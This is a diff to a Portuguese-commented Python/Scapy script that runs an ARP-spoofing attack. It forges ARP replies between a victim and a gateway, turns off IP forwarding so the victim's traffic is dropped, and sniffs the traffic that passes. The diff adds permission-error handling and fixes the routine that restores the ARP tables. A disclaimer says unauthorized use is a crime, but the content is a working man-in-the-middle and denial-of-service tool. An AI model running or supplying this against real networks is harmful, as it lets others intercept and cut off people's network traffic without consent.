@@ -6,6 +6,7 @@
 # sem autorização explícita é crime (Lei 12.737/2012) e de inteira 
 # responsabilidade do usuário.
 # =====================================================================
+
 import threading, time
 
 from scapy.all import ARP, send, Ether, srp, DNS, sniff
@@ -15,7 +16,11 @@ init(autoreset=True)
 def pedir_mac(ip_vit):
     req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_vit, op=1)
     pacote_env, _ = srp(req, timeout=2, verbose=False)
+    if not pacote_env:
+        return
     for envio, receb in pacote_env:
+        if not receb.hwsrc:
+            return
         return receb.hwsrc
 
 def spoof_arp(ip_vitima, ip_gateway):
@@ -24,18 +29,23 @@ def spoof_arp(ip_vitima, ip_gateway):
         return
     pacote = ARP(op=2, pdst=ip_vitima, hwdst=mac_vit, psrc=ip_gateway)
     while True:
-        send(pacote, verbose=False)
-        time.sleep(2)
-
+        try:
+            send(pacote, verbose=False)
+            time.sleep(2)
+        except PermissionError:
+            print("Erro de peemissão (use o sudo)")
+            break
 def restaurar(vitima_inf, source):
     mac_vit = pedir_mac(vitima_inf)
     mac_g = pedir_mac(source)
-    if not mac_vit and mac_g:
+    if not mac_vit and not mac_g:
         return
     pkt = ARP(op=2, pdst=vitima_inf, hwdst=mac_vit, psrc=source, hwsrc=mac_g)
     for _ in range(5):
-        send(pkt, verbose=False)
-
+        try:
+            send(pkt, verbose=False)
+        except PermissionError:
+            print("Erro de peemissão (use o sudo)")
 def filtro_cam(pacote):
     if pacote.haslayer("IP"):
         ip_dst = pacote["IP"].dst
@@ -54,15 +64,15 @@ if __name__ == "__main__":
     vitima, gateway = args.vitima, args.gateway
     print(Fore.RED + f"Vitima {vitima}")
     print(Fore.RED + f"Gateway {gateway}")
-    
+
     with open("/proc/sys/net/ipv4/ip_forward", "w") as n:
         n.write("0")
-        
+
     t1 = threading.Thread(target=spoof_arp, args=(vitima, gateway), daemon=True)
     t2 = threading.Thread(target=spoof_arp, args=(gateway, vitima), daemon=True)
     t1.start()
     t2.start()
-    
+
     try:
         sniff( prn=filtro_cam, store=0 )
     except KeyboardInterrupt:
